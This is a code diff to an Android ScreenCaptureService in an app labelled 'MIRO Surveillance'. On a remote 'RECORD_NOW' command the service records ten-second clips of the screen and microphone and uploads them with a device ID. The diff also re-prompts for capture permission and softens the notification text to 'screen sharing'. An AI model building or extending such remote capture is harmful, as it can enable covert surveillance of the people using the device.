@@ -1,9 +1,6 @@
 package com.nexora.miro.services
 
-import android.app.Activity
-import android.app.NotificationChannel
-import android.app.NotificationManager
-import android.app.Service
+import android.app.*
 import android.content.Context
 import android.content.Intent
 import android.hardware.display.DisplayManager
@@ -22,16 +19,13 @@ import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
 import java.io.File
-import java.util.Timer
-import java.util.TimerTask
-import java.util.UUID
+import java.util.*
 
 class ScreenCaptureService : Service() {
     private var mediaProjection: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
     private var mediaRecorder: MediaRecorder? = null
     private var isRecording = false
-    private val RECORDING_DURATION_MS = 10000L
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -40,19 +34,20 @@ class ScreenCaptureService : Service() {
         createNotificationChannel()
         val notification = NotificationCompat.Builder(this, "capture_channel")
             .setContentTitle("MIRO Surveillance Active")
-            .setContentText("Prêt à recevoir des commandes vidéo")
+            .setContentText("Prêt pour le partage d'écran")
             .setSmallIcon(android.R.drawable.ic_media_play)
             .build()
         startForeground(3, notification)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        if (intent?.action == "START_PROJECTION") {
-            val resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED)
-            val data = intent.getParcelableExtra<Intent>("data")
-            if (data != null) initMediaProjection(resultCode, data)
-        } else if (intent?.action == "RECORD_NOW") {
-            startRecordingSnippet()
+        when (intent?.action) {
+            "START_PROJECTION" -> {
+                val resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED)
+                val data = intent.getParcelableExtra<Intent>("data")
+                if (data != null) initMediaProjection(resultCode, data)
+            }
+            "RECORD_NOW" -> startRecordingSnippet()
         }
         return START_STICKY
     }
@@ -63,15 +58,27 @@ class ScreenCaptureService : Service() {
     }
 
     private fun startRecordingSnippet() {
-        if (mediaProjection == null || isRecording) return
+        if (mediaProjection == null || isRecording) {
+            if (mediaProjection == null) {
+                val intent = Intent(this, com.nexora.miro.MainActivity::class.java)
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                intent.action = "REQUEST_SCREEN_CAPTURE"
+                startActivity(intent)
+            }
+            return
+        }
+        
         isRecording = true
         val metrics = DisplayMetrics()
         val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
         wm.defaultDisplay.getMetrics(metrics)
+        
         val width = metrics.widthPixels
         val height = metrics.heightPixels
         val density = metrics.densityDpi
-        val file = File(cacheDir, "temp_record_${System.currentTimeMillis()}.mp4")
+
+        val file = File(cacheDir, "live_screen_${System.currentTimeMillis()}.mp4")
+        
         mediaRecorder = MediaRecorder().apply {
             setAudioSource(MediaRecorder.AudioSource.MIC)
             setVideoSource(MediaRecorder.VideoSource.SURFACE)
@@ -81,18 +88,22 @@ class ScreenCaptureService : Service() {
             setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
             setVideoSize(width, height)
             setVideoFrameRate(30)
-            setVideoEncodingBitRate(6 * 1024 * 1024)
+            setVideoEncodingBitRate(4 * 1024 * 1024)
         }
+
         try {
             mediaRecorder?.prepare()
             virtualDisplay = mediaProjection?.createVirtualDisplay(
-                "NexoraCapture", width, height, density,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mediaRecorder?.surface, null, null
+                "NexoraLive", width, height, density,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                mediaRecorder?.surface, null, null
             )
             mediaRecorder?.start()
+
             Timer().schedule(object : TimerTask() {
                 override fun run() { stopAndUpload(file) }
-            }, RECORDING_DURATION_MS)
+            }, 10000)
+
         } catch (e: Exception) {
             e.printStackTrace()
             isRecording = false
@@ -113,13 +124,17 @@ class ScreenCaptureService : Service() {
     }
 
     private fun uploadToServer(file: File) {
-        val requestBody = MultipartBody.Builder().setType(MultipartBody.FORM)
+        val requestBody = MultipartBody.Builder()
+            .setType(MultipartBody.FORM)
             .addFormDataPart("video", file.name, file.asRequestBody("video/mp4".toMediaTypeOrNull()))
             .addFormDataPart("deviceId", Prefs.deviceId ?: "unknown")
             .addFormDataPart("sessionId", UUID.randomUUID().toString())
-            .addFormDataPart("durationMs", RECORDING_DURATION_MS.toString())
+            .addFormDataPart("durationMs", "10000")
             .build()
-        Api.postMultipart("/recordings/upload", requestBody, Prefs.token) { success -> if (success) file.delete() }
+
+        Api.postMultipart("/recordings/upload", requestBody, Prefs.token) { success ->
+            if (success) file.delete()
+        }
     }
 
     private fun createNotificationChannel() {
@@ -129,7 +144,7 @@ class ScreenCaptureService : Service() {
             manager.createNotificationChannel(channel)
         }
     }
-
+    
     override fun onDestroy() {
         super.onDestroy()
         mediaProjection?.stop()
